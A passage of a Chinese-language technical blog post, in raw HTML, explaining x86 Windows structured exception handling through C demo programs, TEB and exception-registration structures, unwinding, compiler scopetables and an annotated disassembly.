class="comment">//表示：“我已修正了此异常的故障，请你从事发点重新执行，谢谢”</span></span><br><span class="line">    ExceptionContinueSearch,<span class="comment">//表示：“我没有处理此异常，请你继续搜索其他的解决方案，抱歉”。</span></span><br><span class="line">    ExceptionNestedException,TODO</span><br><span class="line">    ExceptionCollidedUnwind</span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure><h3 id="如何找到回调函数"><a href="#如何找到回调函数" class="headerlink" title="如何找到回调函数"></a>如何找到回调函数</h3><p><strong>结构化异常处理是基于线程的</strong>，三环FS:0指向TEB(Thread Environment Block)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _TEB</span><br><span class="line">nt!_TEB</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x01c EnvironmentPointer : Ptr32 Void</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>_TEB第一个成员NtTib(_NT_TIB)的第一个成员<strong>指向_EXCEPTION_REGISTRATION_RECORD结构的指针</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//回调函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">DWORD scratch;</span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl</span><br><span class="line">_except_handler(<span class="keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,</span><br><span class="line">  <span class="type">void</span>* EstablisherFrame,</span><br><span class="line">  <span class="keyword">struct</span> _CONTEXT* ContextRecord,</span><br><span class="line">  <span class="type">void</span>* DispatcherContext) &#123;</span><br><span class="line">  <span class="type">unsigned</span> i;</span><br><span class="line">  <span class="comment">// 指明是我们让流程转到我们的异常处理程序的</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello from an exception handler\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 改变CONTEXT结构中EAX的值，以便它指向可以成功进写操作的位置</span></span><br><span class="line">  ContextRecord-&gt;Eax = (DWORD)&amp;scratch;</span><br><span class="line">  <span class="comment">// 告诉操作系统重新执行出错的指令</span></span><br><span class="line">  <span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  DWORD handler = (DWORD)_except_handler;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 创建_EXCEPTION_REGISTRATION_RECORD结构：</span></span><br><span class="line">    push handler <span class="comment">// handler函数的地址</span></span><br><span class="line">    push FS : [<span class="number">0</span>] <span class="comment">// 前一个handler函数的地址</span></span><br><span class="line">    mov FS : [<span class="number">0</span>] , ESP <span class="comment">// 安装新的_EXCEPTION_REGISTRATION_RECORD结构</span></span><br><span class="line">  &#125;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    xor eax,eax     <span class="comment">// 将EAX清零</span></span><br><span class="line">    mov[eax], <span class="number">1</span> <span class="comment">// 写EAX指向的内存从而故意引发一个错误</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After writing! scrath %d\n&quot;</span>,scratch);</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 移去我们的EXECEPTION_REGISTRATION_RECODE结构</span></span><br><span class="line">    mov eax, [ESP]    <span class="comment">// 获取前一个结构</span></span><br><span class="line">    mov FS : [<span class="number">0</span>] , EAX <span class="comment">// 安装前一个结构</span></span><br><span class="line">    add esp, <span class="number">8</span>       <span class="comment">// 将我们的EXECEPTION_REGISTRATION_RECODRD弹出堆栈</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mov[eax], 1时系统会先把异常抛给调试器，直接f11步过即可，先在_except_handler处打上断点，不然断不下来</p></blockquote><p><img src="/2023/11/02/SEH-x86/image-20231102161123868.png" alt="image-20231102161123868"></p><h3 id="展开-EH-UNWINDING"><a href="#展开-EH-UNWINDING" class="headerlink" title="展开(EH_UNWINDING)"></a>展开(EH_UNWINDING)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler(</span><br><span class="line">  <span class="keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,</span><br><span class="line">  <span class="type">void</span>* EstablisherFrame,</span><br><span class="line">  <span class="keyword">struct</span> _CONTEXT* ContextRecord,</span><br><span class="line">  <span class="type">void</span>* DispatcherContext) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Home Grown handler: Exception Code: %08X Exception Flags %X&quot;</span>,</span><br><span class="line">    ExceptionRecord-&gt;ExceptionCode, ExceptionRecord-&gt;ExceptionFlags);</span><br><span class="line"> <span class="comment">// http://www.jbox.dk/sanos/source/include/win32.h.html</span></span><br><span class="line">  <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; EH_NONCONTINUABLE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; EH_UNWINDING&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; EH_EXIT_UNWIND&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="number">8</span>) <span class="comment">// 注意这个标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; EH_STACK_INVALID&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x10</span>)   <span class="comment">// 注意这个标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; EH_NESTED_CALL&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我们不想处理这个异常，让其它函数处理吧</span></span><br><span class="line">  <span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HomeGrownFrame</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  DWORD handler = (DWORD)_except_handler;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 创建_EXCEPTION_REGISTRATION_RECORD结构：</span></span><br><span class="line">    push handler       <span class="comment">// handler函数的地址</span></span><br><span class="line">    push FS : [<span class="number">0</span>]        <span class="comment">// 前一个handler函数的地址</span></span><br><span class="line">    mov FS : [<span class="number">0</span>] , ESP     <span class="comment">// 安装新的_EXCEPTION_REGISTRATION_RECORD结构</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(PDWORD)<span class="number">0</span> = <span class="number">0</span>; <span class="comment">// 写入地址0，从而引发一个错误</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should never get here!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 移去我们的_EXCEPTION_REGISTRATION_RECORD结构</span></span><br><span class="line">    mov eax, [ESP]     <span class="comment">// 获取前一个结构</span></span><br><span class="line">    mov FS : [<span class="number">0</span>] , EAX <span class="comment">// 安装前一个结构</span></span><br><span class="line">    add esp, <span class="number">8</span>        <span class="comment">// 把我们_EXCEPTION_REGISTRATION_RECORD结构弹出堆栈</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  __try &#123;</span><br><span class="line">    HomeGrownFrame();</span><br><span class="line">  &#125;</span><br><span class="line">  __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Caught the exception in main()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/02/SEH-x86/image-20231102221245204.png" alt="image-20231102221245204"></p><p>HomeGrownFrame过滤函数返回ExceptionContinueSearch不处理异常，沿着_EXCEPTION_REGISTRATION_RECORD.next找到main的处理函数，接管异常并处理，因此出错指令后面的 printf就永远不会执行</p><p>调用了两次异常处理函数_except_handler，<strong>当异常发生时，系统遍历EXCEPTION_REGISTRATION结构链表，直到它找到一个处理这个异常的处理程序。一旦找到，系统就再次遍历这个链表，直到处理这个异常的结点为止。在这第二次遍历中，系统将再次调用每个异常处理函数。关键的区别是，在第二次调用中，异常标志被设置为2。这个值被定义为EH_UNWINDING。</strong></p><p>当一个函数的异常处理程序拒绝处理某个异常时，通常触发异常的函数执行流程并不会正常地从那个函数退出。第二次调用EH_UNWINDING操作系统给这个函数一个最后清理的机会，比如调用析构函数和__finally块之类的清理工作</p><p>展开操作会把堆栈上创建的_EXCEPTION_REGISTRATION_RECORD结构体清除</p><h2 id="vs编译器层面的SEH"><a href="#vs编译器层面的SEH" class="headerlink" title="vs编译器层面的SEH"></a>vs编译器层面的SEH</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">__try &#123;</span><br><span class="line">    <span class="comment">// 这里是被保护的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except (过滤器表达式) &#123; <span class="comment">//异常过滤</span></span><br><span class="line">   <span class="comment">// 异常处理程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤表达式返回值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Defined values for the exception filter expression</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_EXECUTE_HANDLER      1 <span class="comment">//执行except里面的代码</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_CONTINUE_SEARCH      0 <span class="comment">//寻找下一个异常处理函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_CONTINUE_EXECUTION (-1) <span class="comment">//返回出错位置重新执行</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> <span class="title">PEXCEPTION_REGISTRATION</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span>&#123;</span><span class="comment">//编译器加强版 _EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line">    PEXCEPTION_POINTERS xpointers;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="type">void</span> (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scopetable_entry</span> *<span class="title">scopetable</span>;</span><span class="comment">//指向一个scopetable_entry结构数组</span></span><br><span class="line">    <span class="type">int</span> trylevel;<span class="comment">//scopetable_entry结构数组的索引</span></span><br><span class="line">    <span class="type">int</span> _ebp;<span class="comment">//_EXCEPTION_REGISTRATION结构创建之前栈帧指针（EBP）的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scopetable_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DWORD previousTryLevel; <span class="comment">//用于嵌套的__try块,每个__try块都有一个相应的SCOPETABLE结构,用于保存上一个try在scopetable的编号 </span></span><br><span class="line">  PDWRD lpfnFilter; <span class="comment">//过滤器表达式的起始地址</span></span><br><span class="line">  PDWRD lpfnHandler;  <span class="comment">//异常处理程序的地址     </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管有多少try&#x2F;except块，多少层嵌套，在使用SEH的一个函数中只创建一个EXCEPTION_REGISTRATION结构</p><p>每个try会对EXCEPTION_REGISTRATION.trylevel赋予不同的值，来scopetable里找到属于自己的异常处理流程，嵌套try通过scopetable_entry.previousTryLevel找到异常处理流程</p><p><strong>测试程序</strong></p><p>链接：<a href="https://pan.baidu.com/s/1_VfVoWSEE1EqOZ1KIaEm3A">https://pan.baidu.com/s/1_VfVoWSEE1EqOZ1KIaEm3A</a><br>提取码：tjxw</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(PEXCEPTION_POINTERS exceptionInfo)</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;second inner filter&quot;</span>);</span><br><span class="line">  exceptionInfo-&gt;ContextRecord-&gt;Eax = &amp;flag;</span><br><span class="line">  <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  __try &#123;</span><br><span class="line">    *(PDWORD)<span class="number">0</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __except (<span class="built_in">puts</span>(<span class="string">&quot;first filter&quot;</span>), EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;first hadle&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __try &#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">      __asm &#123;</span><br><span class="line">        xor eax, eax</span><br><span class="line">        mov[eax], <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, flag);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (filter(GetExceptionInformation())) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;second inner handle&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __except (<span class="built_in">puts</span>(<span class="string">&quot;secode filter&quot;</span>), EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;second handle&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;main end&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/02/SEH-x86/image-20231103221002024.png" alt="image-20231103221002024"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00401070</span> ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:00401070 _main proc near                         ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:<span class="number">00401070</span></span><br><span class="line">.text:<span class="number">00401070</span> ms_exc= CPPEH_RECORD ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">00401070</span> argc= dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00401070</span> argv= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">00401070</span> envp= dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">00401070</span></span><br><span class="line">.text:<span class="number">00401070</span> ; __unwind &#123; <span class="comment">// __except_handler3</span></span><br><span class="line">.text:<span class="number">00401070</span> push    ebp</span><br><span class="line">.text:<span class="number">00401071</span> mov     ebp, esp</span><br><span class="line">.text:<span class="number">00401073</span> push    <span class="number">0F</span>FFFFFFFh                      ; _EXCEPTION_REGISTRATION.trylevel</span><br><span class="line">.text:<span class="number">00401075</span> push    offset stru_402568              ; _EXCEPTION_REGISTRATION.scopetable</span><br><span class="line">.text:<span class="number">0040107</span>A push    offset __except_handler3        ; _EXCEPTION_REGISTRATION.handler</span><br><span class="line">.text:<span class="number">0040107F</span> mov     eax, large fs:<span class="number">0</span>                 ; prev</span><br><span class="line">.text:<span class="number">00401085</span> push    eax                             ; _EXCEPTION_REGISTRATION.prev</span><br><span class="line">.text:<span class="number">00401086</span> mov     large fs:<span class="number">0</span>, esp                 ; 安装seh</span><br><span class="line">.text:<span class="number">0040108</span>D sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00401090</span> push    ebx</span><br><span class="line">.text:<span class="number">00401091</span> push    esi</span><br><span class="line">.text:<span class="number">00401092</span> push    edi</span><br><span class="line">.text:<span class="number">00401093</span> mov     [ebp+ms_exc.old_esp], esp       ; 保存当前函数栈帧ESP</span><br><span class="line">.text:<span class="number">00401093</span></span><br><span class="line">.text:<span class="number">00401096</span> ;   __try &#123; <span class="comment">// __except at $LN8</span></span><br><span class="line">.text:<span class="number">00401096</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span> ; 当前try块的scopetable数组下标trylevel为<span class="number">0</span></span><br><span class="line">.text:<span class="number">0040109</span>D mov     large dword ptr ds:<span class="number">0</span>, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0040109</span>D ;   &#125; <span class="comment">// starts at 401096</span></span><br><span class="line">.text:<span class="number">004010</span>A7 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFFh ; 当前try块结束</span><br><span class="line">.text:<span class="number">004010</span>AE jmp     <span class="type">short</span> loc_4010DC                ;</span><br><span class="line">.text:<span class="number">004010</span>AE                                         ; 当前try块的scopetable数组下标trylevel为<span class="number">1</span></span><br><span class="line">.text:<span class="number">004010</span>AE</span><br><span class="line">.text:<span class="number">004010B</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">004010B</span>0</span><br><span class="line">.text:<span class="number">004010B</span>0 $LN7:                                   ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">004010B</span>0 ;   __except filter <span class="comment">// owned by 401096</span></span><br><span class="line">.text:<span class="number">004010B</span>0 push    offset aFirstFilter             ; <span class="string">&quot;first filter&quot;</span></span><br><span class="line">.text:<span class="number">004010B</span>5 call    ds:__imp__puts</span><br><span class="line">.text:<span class="number">004010B</span>5</span><br><span class="line">.text:<span class="number">004010B</span>B add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">004010B</span>E mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">004010</span>C3</span><br><span class="line">.text:<span class="number">004010</span>C3 $LN9:</span><br><span class="line">.text:<span class="number">004010</span>C3 retn</span><br><span class="line">.text:<span class="number">004010</span>C3</span><br><span class="line">.text:<span class="number">004010</span>C4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">004010</span>C4</span><br><span class="line">.text:<span class="number">004010</span>C4 $LN8:                                   ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">004010</span>C4 ;   __except($LN7) <span class="comment">// owned by 401096   ;</span></span><br><span class="line">.text:<span class="number">004010</span>C4 mov     esp, [ebp+ms_exc.old_esp]       ; 执行expect块里的异常处理程序时，先恢复异常发送时的栈帧</span><br><span class="line">.text:<span class="number">004010</span>C7 push    offset aFirstHadle              ; <span class="string">&quot;first hadle&quot;</span></span><br><span class="line">.text:<span class="number">004010</span>CC call    ds:__imp__puts</span><br><span class="line">.text:<span class="number">004010</span>CC</span><br><span class="line">.text:<span class="number">004010</span>D2 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">004010</span>D5 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">004010</span>D5</span><br><span class="line">.text:<span class="number">004010</span>DC</span><br><span class="line">.text:<span class="number">004010</span>DC loc_4010DC:                             ; CODE XREF: _main+<span class="number">3</span>E↑j</span><br><span class="line">.text:<span class="number">004010</span>DC ;   __try &#123; <span class="comment">// __except at $LN12        ;</span></span><br><span class="line">.text:<span class="number">004010</span>DC mov     [ebp+ms_exc.registration.TryLevel], <span class="number">1</span> ; 当前try块的scopetable数组下标trylevel为<span class="number">1</span></span><br><span class="line">.text:<span class="number">004010</span>DC ;   &#125; <span class="comment">// starts at 4010DC</span></span><br><span class="line">.text:<span class="number">004010</span>DC</span><br><span class="line">.text:<span class="number">004010E3</span> ;   __try &#123; <span class="comment">// __except at $LN16</span></span><br><span class="line">.text:<span class="number">004010E3</span> ;     __try &#123; <span class="comment">// __except at $LN12</span></span><br><span class="line">.text:<span class="number">004010E3</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="number">2</span> ; 当前try块的scopetable数组下标trylevel为<span class="number">2</span></span><br><span class="line">.text:<span class="number">004010</span>EA xor     eax, eax</span><br><span class="line">.text:<span class="number">004010</span>EC mov     byte ptr [eax], <span class="number">1</span></span><br><span class="line">.text:<span class="number">004010</span>EF mov     eax, _flag</span><br><span class="line">.text:<span class="number">004010F</span>4 push    eax</span><br><span class="line">.text:<span class="number">004010F</span>5 push    offset _Format                  ; <span class="string">&quot;%d\n&quot;</span></span><br><span class="line">.text:<span class="number">004010F</span>A call    _printf</span><br><span class="line">.text:<span class="number">004010F</span>A</span><br><span class="line">.text:<span class="number">004010F</span>F add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">004010F</span>F ;     &#125; <span class="comment">// starts at 4010E3</span></span><br><span class="line">.text:<span class="number">004010F</span>F ;   &#125; <span class="comment">// starts at 4010E3</span></span><br><span class="line">.text:<span class="number">004010F</span>F</span><br><span class="line">.text:<span class="number">00401102</span> ;   __try &#123; <span class="comment">// __except at $LN12</span></span><br><span class="line">.text:<span class="number">00401102</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="number">1</span> ; 内部嵌套的try块结束后，立即将scopetable数组下标trylevel设置为外部try块的</span><br><span class="line">.text:<span class="number">00401109</span> jmp     <span class="type">short</span> loc_401130</span><br><span class="line">.text:<span class="number">00401109</span></span><br><span class="line">.text:<span class="number">0040110B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0040110B</span></span><br><span class="line">.text:<span class="number">0040110B</span> $LN15:                                  ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">0040110B</span> ;   __except filter <span class="comment">// owned by 4010E3</span></span><br><span class="line">.text:<span class="number">0040110B</span> mov     ecx, [ebp+ms_exc.exc_ptr]</span><br><span class="line">.text:<span class="number">0040110</span>E push    ecx                             ; exceptionInfo</span><br><span class="line">.text:<span class="number">0040110F</span> call    _filter</span><br><span class="line">.text:<span class="number">0040110F</span></span><br><span class="line">.text:<span class="number">00401114</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401117</span></span><br><span class="line">.text:<span class="number">00401117</span> $LN17:</span><br><span class="line">.text:<span class="number">00401117</span> retn</span><br><span class="line">.text:<span class="number">00401117</span></span><br><span class="line">.text:<span class="number">00401118</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00401118</span></span><br><span class="line">.text:<span class="number">00401118</span> $LN16:                                  ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">00401118</span> ;   __except($LN15) <span class="comment">// owned by 4010E3</span></span><br><span class="line">.text:<span class="number">00401118</span> mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">.text:<span class="number">0040111B</span> push    offset aSecondInnerHan          ; <span class="string">&quot;second inner handle&quot;</span></span><br><span class="line">.text:<span class="number">00401120</span> call    ds:__imp__puts</span><br><span class="line">.text:<span class="number">00401120</span></span><br><span class="line">.text:<span class="number">00401126</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401126</span> ;   &#125; <span class="comment">// starts at 401102</span></span><br><span class="line">.text:<span class="number">00401126</span></span><br><span class="line">.text:<span class="number">00401129</span> ;   __try &#123; <span class="comment">// __except at $LN12</span></span><br><span class="line">.text:<span class="number">00401129</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="number">1</span></span><br><span class="line">.text:<span class="number">00401129</span> ;   &#125; <span class="comment">// starts at 401129</span></span><br><span class="line">.text:<span class="number">00401129</span></span><br><span class="line">.text:<span class="number">00401130</span></span><br><span class="line">.text:<span class="number">00401130</span> loc_401130:                             ; CODE XREF: _main+<span class="number">99</span>↑j</span><br><span class="line">.text:<span class="number">00401130</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">00401137</span> jmp     <span class="type">short</span> loc_401165</span><br><span class="line">.text:<span class="number">00401137</span></span><br><span class="line">.text:<span class="number">00401139</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00401139</span></span><br><span class="line">.text:<span class="number">00401139</span> $LN11:                                  ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">00401139</span> ;   __except filter <span class="comment">// owned by 4010DC</span></span><br><span class="line">.text:<span class="number">00401139</span> ;   __except filter <span class="comment">// owned by 4010E3</span></span><br><span class="line">.text:<span class="number">00401139</span> ;   __except filter <span class="comment">// owned by 401102</span></span><br><span class="line">.text:<span class="number">00401139</span> ;   __except filter <span class="comment">// owned by 401129</span></span><br><span class="line">.text:<span class="number">00401139</span> push    offset aSecodeFilter            ; <span class="string">&quot;secode filter&quot;</span></span><br><span class="line">.text:<span class="number">0040113</span>E call    ds:__imp__puts</span><br><span class="line">.text:<span class="number">0040113</span>E</span><br><span class="line">.text:<span class="number">00401144</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401147</span> mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0040114</span>C</span><br><span class="line">.text:<span class="number">0040114</span>C $LN13:</span><br><span class="line">.text:<span class="number">0040114</span>C retn</span><br><span class="line">.text:<span class="number">0040114</span>C</span><br><span class="line">.text:<span class="number">0040114</span>D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0040114</span>D</span><br><span class="line">.text:<span class="number">0040114</span>D $LN12:                                  ; DATA XREF: .rdata:stru_402568↓o</span><br><span class="line">.text:<span class="number">0040114</span>D ;   __except($LN11) <span class="comment">// owned by 4010DC</span></span><br><span class="line">.text:<span class="number">0040114</span>D ;   __except($LN11) <span class="comment">// owned by 4010E3</span></span><br><span class="line">.text:<span class="number">0040114</span>D ;   __except($LN11) <span class="comment">// owned by 401102</span></span><br><span class="line">.text:<span class="number">0040114</span>D ;   __except($LN11) <span class="comment">// owned by 401129</span></span><br><span class="line">.text:<span class="number">0040114</span>D mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">.text:<span class="number">00401150</span> push    offset aSecondHandle            ; <span class="string">&quot;second handle&quot;</span></span><br><span class="line">.text:<span class="number">00401155</span> call    ds:__imp__puts</span><br><span class="line">.text:<span 